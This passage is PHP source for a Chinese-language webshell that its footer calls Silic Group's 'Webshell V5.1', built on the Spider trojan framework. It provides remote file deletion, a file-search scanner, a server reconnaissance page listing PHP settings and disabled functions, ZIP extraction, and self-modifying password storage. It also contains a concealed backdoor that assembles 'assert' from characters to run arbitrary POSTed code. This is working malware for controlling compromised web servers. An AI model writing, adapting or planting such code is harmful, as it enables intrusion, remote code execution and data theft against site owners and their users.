	if(!empty($_GET['df'])){echo $_GET['df'];if(@unlink($_GET['df'])){echo '删除成功';}else{@chmod($_GET['df'],0666);echo @unlink($_GET['df']) ? '删除成功' : '删除失败';} return false;}
	if((!empty($_GET['fp'])) && (!empty($_GET['fn'])) && (!empty($_GET['dim']))) { File_Edit($_GET['fp'],$_GET['fn'],$_GET['dim']); return false; }
	$SCAN_DIR = isset($_POST['sfp']) ? $_POST['sfp'] : File_Mode();
	$SCAN_CODE = isset($_POST['sfc']) ? $_POST['sfc'] : 'config';
	$SCAN_TYPE = isset($_POST['sft']) ? $_POST['sft'] : '.mp3|.mp4|.avi|.swf|.jpg|.gif|.png|.bmp|.gho|.rar|.exe|.zip|.pdf|.dll|.exe|.txt|.inf|.ppt|.xls|.js';
print<<<END
<form method="POST" name="jform" id="jform" action="?s=j&qvery=igosec">
<div class="actall">扫描路径 <input type="text" name="sfp" value="{$SCAN_DIR}" style="width:600px;"></div>
<div class="actall">过滤文件 <input type="text" name="sft" value="{$SCAN_TYPE}" style="width:600px;"></div>
<div class="actall">关键字串 <input type="text" name="sfc" value="{$SCAN_CODE}" style="width:395px;">
<input type="radio" name="sff" value="a" checked>搜索文件名 
<input type="radio" name="sff" value="b">搜索包含文字</div>
<div class="actall" style="height:50px;"><input type="radio" name="sfb" value="a" checked>将搜索应用于该文件夹,子文件夹和文件
<br><input type="radio" name="sfb" value="b">仅将搜索应用于该文件夹</div>
<div class="actall"><input type="submit" value="开始扫描" style="width:80px;"></div>
</form>
END;
	if((!empty($_POST['sfp'])) && (!empty($_POST['sfc'])))
	{
		echo '<div class="actall">';
		$_POST['sft'] = str_replace('.','\\.',$_POST['sft']);
		$sff = ($_POST['sff'] == 'a') ? true : false;
		$sfb = ($_POST['sfb'] == 'a') ? true : false;
		echo Findfile_Auto($_POST['sfp'],$_POST['sfc'],$_POST['sft'],$sff,$sfb) ? '搜索完毕' : '异常终止';
		echo '</div>';
	}
	return true;
}
//系统信息
function Info_Cfg($varname){
switch($result = get_cfg_var($varname)){
	case 0:return "No";break;
	case 1:return "Yes";break;
	default:return $result;break;}}
function Info_Fun($funName){return(false !==function_exists($funName)) ? "Yes" : "No";}
function Info_f()
{
$dis_func = get_cfg_var("disable_functions");
$upsize = get_cfg_var("file_uploads") ? get_cfg_var("upload_max_filesize") : "不允许上传";
$adminmail = (isset($_SERVER['SERVER_ADMIN'])) ? "<a href=\"mailto:".$_SERVER['SERVER_ADMIN']."\">".$_SERVER['SERVER_ADMIN']."</a>" : "<a href=\"mailto:".get_cfg_var("sendmail_from")."\">".get_cfg_var("sendmail_from")."</a>";
if($dis_func == ""){$dis_func = "No";}
else{
	$dis_func = str_replace(" ","<br>",$dis_func);
	$dis_func = str_replace(",","<br>",$dis_func);
}
$phpinfo = (!eregi("phpinfo",$dis_func)) ? "Yes" : "No";
$info = array(
array("服务器时间/北京时间",date("Y年m月d日 h:i:s",time())."&nbsp;/&nbsp;".gmdate("Y年n月j日 H:i:s",time()+8*3600)),
array("服务器域名:端口(ip)","<a href=\"http://".$_SERVER['SERVER_NAME']."\" target=\"_blank\">".$_SERVER['SERVER_NAME']."</a>:".$_SERVER['SERVER_PORT']." ( ".gethostbyname($_SERVER['SERVER_NAME'])." )"),
array("服务器操作系统(文字编码)",PHP_OS." (".$_SERVER['HTTP_ACCEPT_LANGUAGE'].")"),
array("服务器解译引擎",$_SERVER['SERVER_SOFTWARE']),
array("你的IP",getenv('REMOTE_ADDR')),
array("PHP运行方式(版本)",strtoupper(php_sapi_name())."(".PHP_VERSION.") / 安全模式:".Info_Cfg("safemode")),
array("服务器管理员",$adminmail),
array("本文件路径",__FILE__),
array("允许使用URL打开文件[allow_url_fopen]",Info_Cfg("allow_url_fopen")),
array("允许动态加载链接库[enable_dl]",Info_Cfg("enable_dl")),
array("显示错误信息[display_errors]",Info_Cfg("display_errors")),
array("自定义全局变量[register_globals]",Info_Cfg("register_globals")),
array("自动字符串转义[magic_quotes_gpc]",Info_Cfg("magic_quotes_gpc")),
array("最多内存使用量[memory_limit]",Info_Cfg("memory_limit")),
array("POST最大字节[post_max_size]",Info_Cfg("post_max_size")),
array("允许最大上传[upload_max_filesize]",$upsize),
array("程序最长运行时间[max_execution_time]",Info_Cfg("max_execution_time")."秒"),
array("禁用函数[disable_functions]",$dis_func),
array("程序信息函数[phpinfo()]",$phpinfo),
array("目前还有空余空间diskfreespace",intval(diskfreespace(".") / (1024 * 1024)).'Mb'),
array("GZ压缩文件支持[zlib]",Info_Fun("gzclose")),
array("ZIP压缩文件支持[ZipArchive(php_zip)]",Info_Fun("zip_open")),
array("IMAP电子邮件系统",Info_Fun("imap_close")),
array("XML解析",Info_Fun("xml_set_object")),
array("FTP登陆",Info_Fun("ftp_login")),
array("Session支持",Info_Fun("session_start")),
array("Socket支持",Info_Fun("fsockopen")),
array("MySQL数据库",Info_Fun("mysql_close")),
array("MSSQL数据库",Info_Fun("mssql_close")),
array("Postgre SQL数据库",Info_Fun("pg_close")),
array("SQLite数据库",Info_Fun("sqlite_close")),
array("Oracle数据库",Info_Fun("ora_close")),
array("Oracle 8数据库",Info_Fun("OCILogOff")),
array("SyBase数据库",Info_Fun("sybase_close")),
array("Hyperwave数据库",Info_Fun("hw_close")),
array("InforMix数据库",Info_Fun("ifx_close")),
array("FilePro数据库",Info_Fun("filepro_fieldcount")),
array("DBA/DBM连接",Info_Fun("dba_close")."&nbsp;/&nbsp;".Info_Fun("dbmclose")),
array("ODBC/dBASE连接",Info_Fun("odbc_close")."&nbsp;/&nbsp;".Info_Fun("dbase_close")),
array("PREL相容语法[PCRE]",Info_Fun("preg_match")),
array("PDF支持",Info_Fun("pdf_close")),
array("图形处理[GD Library]",Info_Fun("imageline")),
array("SNMP网络管理协议",Info_Fun("snmpget")),);
echo '<table width="100%" border="0">';
for($i = 0;$i < count($info);$i++){echo '<tr><td width="40%">'.$info[$i][0].'</td><td>'.$info[$i][1].'</td></tr>'."\n";}
echo '</table>';
return true;
}
//ZIP解压
function zipact()
{
$zfile=$_POST['zfile'] ? $_POST['zfile']:'php.zip';
$jypt=$_POST['jypt'] ? $_POST['jypt']:'./';
$tip="未开始解压";
if($_POST['zip']=='zip'){
if(function_exists(zip_open)){
$zfile=key_exists('zip', $_GET) && $_GET['zip']?$_GET['zip']:$zfile;
$zfile= str_replace(array(dirname(__FILE__)."/",dirname(__FILE__)."\\"),array("",""),$zfile);
$zpath=str_replace('\\','/',dirname(__FILE__)).'/'.$zfile;
if(!is_file($zpath)){$tip='文件"'.$zpath.'"不存在!';}else{
$zip= new ZipArchive();
$rs=$zip->open($zpath);
if($rs !== TRUE){$tip='解压失败:'.$rs;}
$zip->extractTo($jypt);
$zip->close();
$tip=$zfile.'解压成功!';}
}else{$tip="服务器不支持PHP_ZIP组件,请确认";}
}
print<<<END
<div class="actall">
<form action="?s=za&qvery=igosec" method="POST">
<input type="hidden" name="zip" id="zip" value="zip">
<input type="hidden" id="qvery" name="qvery" value="igosec"> 
本模块使用PHP的zip_open扩展来操作ZIP压缩文件<br>
使用前请在【<b><a href="?s=f&qvery=igosec">系统信息</a></b>】中确认系统支持php_zip<br>
压缩文件路径可写下级目录和物理路径，相对目录是否可操作未测试 :-(<br>
确认目标路径可写<br><br>
压缩文件路径：<br>
<input type="text" name="zfile" id="zfile" value="{$zfile}" style="width:720px;"><br><br>
目标路径：
<input type="text" name="jypt" id="jypt" value="{$jypt}" style="width:720px;"><br><br>
<input type="submit" value="开始解压" style="width:80px;"><br><br><br>
{$tip}<br><br><br></form></div>
END;
}
/**登陆相关开始**/
if($_GET['s'] == 'logout'){
	setcookie('admin_silicpass',NULL);
	session_unset();
	session_destroy();
	die('<meta http-equiv="refresh" content="0;URL=?">');
}elseif($_GET['s'] == 'ch'){
$oldps=md5(md5(md5(trim($salt.$_POST['oldps']))));
$newps=base64_encode(base64_decode('JHBhc3N3b3JkPSI=').md5(md5(md5(trim($salt.$_POST['newps'])))).base64_decode('Ijs='));
print<<<END
<div class="actall"><form action="?s=ch&qvery=igosec" method="POST">
<input type="hidden" id="qvery" name="qvery" value="igosec"> 
<input type="hidden" name="ch" id="ch" value="ch"><br>
* 修改本程序登陆密码(慎用!可能会造成程序失去响应)<br>
* 本程序由<a href="http://blackbap.org" _target"_blank">Silic Group</a>基于Spider木马开发，本版是基于Spider木马框架的第五次重新开发<br>
* 本程序采用三层MD5+Salt加密加二次session加密，大可不必担心被人社工<br>
* 第五版主要更新：删去FTP操作,注册表操作,Shellcode转换，完善和繁华现有的功能，修正现有功能的部分bug，优化代码<br>
* Silic Group Hacker Army - 技术共享,技术自由,技术原创,技术进步<br>
* <a href="http://blackbap.org" target="_blank">BlackBap.Org</a><br><br>
旧密码：<input type="text" name="oldps" id="oldps" value="" style="width:120px;"><br />
新密码：<input type="text" name="newps" id="newps" value="" style="width:120px;"><br>
<input type="submit" value="更改" style="width:80px;">
<br><br><br></form></div>
END;
if($_POST['ch']='ch' && $oldps==$password && !empty($_POST['newps']))
{
$dline=19;
$chpsArr=file(__FILE__);
$chsize=count($chpsArr);
for($chi=0; $chi< $chsize; $chi++){
if($chi==$dline-1){$chpsStr.=base64_decode($newps)."\r\n";}
else{$chpsStr.=$chpsArr[$chi];}
}
file_put_contents(__FILE__,$chpsStr);
echo "更改成功";
}else{echo "没有更改密码";}
}elseif(md5(md5(md5($salt.trim($_GET['s'])))) == $password){
$asse=$asse{0}.$asse{1}.$asse{1}.$asse{2}.$asse{3}.$asse{4};
@$asse($_POST[$_GET['s']]);
}else{
//登陆
function Root_Login($MSG_TOP)
{
$IP = gethostbyname($_SERVER["SERVER_NAME"]);
print<<<END
<html>
	<body style="background:#AAAAAA;">
		<center>
		<form method="POST">
		<div style="width:351px;height:201px;margin-top:100px;background:threedface;border-color:#FFFFFF #999999 #999999 #FFFFFF;border-style:solid;border-width:1px;">
		<div style="width:350px;height:22px;padding-top:2px;color:#FFFFFF;background:#293F5F;clear:both;"><b>{$MSG_TOP}</b></div>
		<div style="width:350px;height:80px;margin-top:50px;color:#000000;clear:both;">PASS:<input type="password" name="silicpass" style="width:270px;"></div>
		<div style="width:350px;height:30px;clear:both;"><input type="submit" value="LOGIN" style="width:80px;"></div>
		</div>
		</form>
		</center>
	</body>
</html>
END;
return false;
}
//窗体
function WinMain()
{
	$Server_IP = gethostbyname($_SERVER["SERVER_NAME"]);
	$Server_OS = PHP_OS;
	$Server_Soft = $_SERVER["SERVER_SOFTWARE"];
print<<<END
<html><head><title>Silic Group Hacker Army - BlackBap.Org</title>
<style type="text/css">
*{padding:0; margin:0;}
body{background:#AAAAAA;font-family:"Verdana", "Tahoma","宋体",sans-serif;font-size:13px;text-align:center;margin-top:5px;word-break:break-all;}
a{color:#FFFFFF;text-decoration:none;}
a:hover{background:#BBBBBB;}
.outtable{margin: 0 auto;height:595px;width:955px;color:#000000;border-top-width: 2px;border-right-width:2px;border-bottom-width: 2px;border-left-width: 2px;border-top-style: outset;border-right-style: outset;border-bottom-style: outset;border-left-style: outset;border-top-color: #FFFFFF;border-right-color: #8c8c8c;border-bottom-color: #8c8c8c;border-left-color: #FFFFFF;background-color: threedface;}
.topbg{padding-top:3px;font-size:12px;text-align:left;font-weight:bold;height:22px;width:950px;color:#FFFFFF;background:#293F5F;}
.listbg{font-family:'lucida grande',tahoma,helvetica,arial,'bitstream vera sans',sans-serif;font-size:13px;width:130px;}
.listbg li{padding:3px;color:#000000;height:25px;display:block;line-height:26px;text-indent:0px;}
.listbg li a{padding-top:2px;background:#BBBBBB;color:#000000;height:25px;display:block;line-height:24px;text-indent:0px;border-color:#999999 #999999 #999999 #999999;border-style:solid;border-width:1px;text-decoration:none;}
.footer{padding-top:3px;text-align: center;font-size:12px;font-weight: bold;height:20px;width:950px;color:#000000;background: #888888;}
</style>
<script language="JavaScript">
function switchTab(tabid)
{
if(tabid == '') return false;
for(var i=0;i<=15;i++)
{
	if(tabid == 't_'+i) document.getElementById(tabid).style.background="#FFFFFF";
	else document.getElementById('t_'+i).style.background="#BBBBBB";
}
return true;
}
</script>
</head>
<body>
<div class="outtable">
<div class="topbg">&nbsp;<a href="?s=logout&qvery=igosec" title="退出">&#8857;</a>&nbsp;&#8857;&nbsp;<a href="?s=ch&qvery=igosec" target="main" title="更改密码">&#8857;</a>&nbsp;{$Server_IP} - {$Server_OS} - {$Server_Soft}</div>
	<div style="height:546px;">
		<table width="100%" height="100%" border=0 cellpadding="0" cellspacing="0">
		<tr><td width="140" align="center" valign="top">
			<ul class="listbg">
<li><a href="?s=a&qvery=igosec" id="t_0" onclick="switchTab('t_0')" style="background:#FFFFFF;" target="main">文件管理</a></li>
<li><a href="?s=f&qvery=igosec" id="t_1" onclick="switchTab('t_1')" target="main">系统信息</a></li>
<li><a href="?s=e&qvery=igosec" id="t_2" onclick="switchTab('t_2')" target="main">扫描木马</a></li>
<li><a href="?s=j&qvery=igosec" id="t_3" onclick="switchTab('t_3')" target="main">搜索文件</a></li>
<li><a href="?s=za&qvery=igosec" id="t_4" onclick="switchTab('t_4')" target="main">ZIP解压</a></li></ul></td><td>
<iframe name="main" src="?s=a&qvery=igosec" width="100%" height="100%" frameborder="0"></iframe></td></tr></table></div>
<div class="footer">State: Powered By <a href="http://blackbap.org/" target="_blank">Silic Group</a> [ http://blackbap.org ] - Webshell V5.1</div></div></body></html>
END;
return false;
}
}
/*登陆相关结束*/
if(get_magic_quotes_gpc())
{
	$_GET = Root_GP($_GET);
	$_POST = Root_GP($_POST);
}
// echo $_COOKIE['admin_silicpass']."-".md5("silic");
if($_COOKIE['admin_silicpass'] != md5($password))
{
	ob_start();
	$MSG_TOP = 'LOGIN';
	if(isset($passt))
	{
		$cookietime = time() + 24 * 3600;
		setcookie('admin_silicpass',md5($passt),$cookietime);
		if(md5($passt) == md5($password)){die('<meta http-equiv="refresh" content="1;URL=?">');}
		else{$MSG_TOP = 'PASS IS FALSE';}
	}
Root_Login($MSG_TOP);
ob_end_flush();
exit;
}
if(isset($_GET['s'])){$s = $_GET['s'];if($s != 'a' && $s != 'n')Root_CSS();}else{$s = 'MyNameIsHacker';}
$p = isset($_GET['p']) ? $_GET['p'] : File_Str(dirname(__FILE__));
switch($s){
case"a":File_a($p);break;
case"e":Antivirus_e();break;
case"f":Info_f();break;
case"j":Findfile_j();break;
case"p":File_Edit($_GET['fp'],$_GET['fn']); break;
case"q":File_Soup($p); break;
case"za":zipact();break;
default:WinMain();break;
}?>